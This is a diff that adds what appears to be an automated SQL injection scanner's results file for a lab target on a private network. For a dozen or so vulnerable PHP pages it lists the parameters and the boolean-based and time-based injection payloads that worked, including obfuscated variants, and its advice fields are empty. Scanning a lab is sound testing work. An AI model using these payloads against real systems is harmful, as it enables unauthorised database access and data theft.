@@ -1,0 +1,124 @@
+Target: http://192.168.42.133 (GET)
+
+---
+URL:http://192.168.42.133/sqli/example1.php (GET)
+VulnName: 
+Query: {'name': 'root'}
+Payload: '	and	'250'='250
+'	and	'5482'='5482
+'	or	12111=12111#
+'	and	'68183'='68184
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example2.php (GET)
+VulnName: 
+Query: {'name': 'root'}
+Payload: '	and	'250'='250
+'	and	'5482'='5482
+'	or	12111=12111#
+'	and	'68183'='68184
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example4.php (GET)
+VulnName: 
+Query: {'id': '2'}
+Payload: 	and	75007=75007
+	and	44899=44899
+	or	93515=93515#
+	and	93608=93609
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example6.php (GET)
+VulnName: 
+Query: {'id': '2'}
+Payload: 	and	75007=75007
+	and	44899=44899
+	or	93515=93515#
+	and	93608=93609
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example5.php (GET)
+VulnName: 
+Query: {'id': '2'}
+Payload: 	and	75007=75007
+	and	44899=44899
+	or	93515=93515#
+	and	93608=93609
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example3.php (GET)
+VulnName: 
+Query: {'name': 'root'}
+Payload: '/**/and/**/'60066'='60066
+'/**/and/**/'24152'='24152
+'/**/or/**/15419=15419#
+'/**/and/**/'92207'='92208
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example7.php (GET)
+VulnName: 
+Query: {'id': '2'}
+Payload: 
+and
+4389=4389
+
+and
+70902=70902
+
+or
+85641=85641#
+
+and
+64553=64554
+Advice: 
+---
+---
+URL:http://192.168.42.133/xml/example2.php (GET)
+VulnName: 
+Query: {'name': 'hacker'}
+Payload: '+and+'69290'='69290
+'+and+'75416'='75416
+'+or+4690=4690#
+'+and+'12032'='12033
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example101.php (GET)
+VulnName: 
+Query: {'name': 'root'}
+Payload: '	and	'250'='250
+'	and	'5482'='5482
+'	or	12111=12111#
+'	and	'68183'='68184
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example100.php (GET)
+VulnName: 
+Query: {'name': 'root'}
+Payload: '	and	'250'='250
+'	and	'5482'='5482
+'	or	12111=12111#
+'	and	'68183'='68184
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example9.php (GET)
+VulnName: 
+Query: {'order': 'name'}
+Payload:  or SLEEP(3);-- 
+Advice: 
+---
+---
+URL:http://192.168.42.133/sqli/example8.php (GET)
+VulnName: 
+Query: {'order': 'name'}
+Payload: ` or SLEEP(3);-- 
+Advice: 
+---
